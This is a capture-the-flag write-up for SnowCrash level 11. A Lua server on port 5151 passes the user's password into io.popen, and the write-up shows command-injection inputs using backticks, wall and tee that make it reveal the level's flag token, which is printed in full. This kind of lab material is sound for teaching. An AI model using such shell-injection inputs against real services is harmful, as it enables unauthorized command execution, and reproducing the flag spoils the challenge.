# Level11

We have a `lua` program. It's a server in port `5151` in which a password is waiting.  
So we can launch a client with `nc`.  

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: test
Erf nope..
```

`prog = io.popen("echo "..pass.." | sha1sum", "r")` In lua this line allow user to execute a `command`.  
An another specificity is the `..`. This token is used to concatenate 2 strings.  
So if our `pass` variable is set as `test` the command send in io.popen will be `echo test | sha1sum`.  

So we can use this operation to create a command with `getflag`.  

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag`                                                                               
Erf nope..
```

I think it's working but in the code no message with the output is send to the client. So we can try to use `wall` to send the output at all clients.  

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` | wall
                                                                               
Broadcast Message from flag11@Snow                                             
        (somewhere) at 2:00 ...                                                
                                                                               
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                                                                                       
Erf nope..
```

We can also use `tee` command to get the flag. This command read the stdout and write the content stdout AND file given.  

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: `getflag` | tee /tmp/token
Erf nope..
level11@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

level11@SnowCrash:~$ su level12
Password: 
level12@SnowCrash:~$ id
uid=2012(level12) gid=2012(level12) groups=2012(level12),100(users)
```
